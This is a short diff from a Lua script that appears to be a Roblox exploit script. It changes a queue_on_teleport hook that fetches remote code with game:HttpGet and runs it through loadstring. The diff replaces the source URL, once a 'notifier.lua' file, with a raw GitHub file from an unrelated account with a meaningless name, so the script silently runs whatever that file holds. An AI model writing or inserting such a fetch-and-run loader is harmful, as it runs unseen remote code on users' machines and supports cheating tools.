@@ -191,7 +191,7 @@ end)
 if queue_on_teleport then
 	queue_on_teleport([[
 		loadstring(game:HttpGet(
-			"https://raw.githubusercontent.com/nguyenhuynhquocvuong07xel-cell/rinolive-notifiercity/main/notifier.lua",
+			"https://raw.githubusercontent.com/statzz-scr/ahhhh/refs/heads/main/asdasd",
 			true
 		))()
 	]])
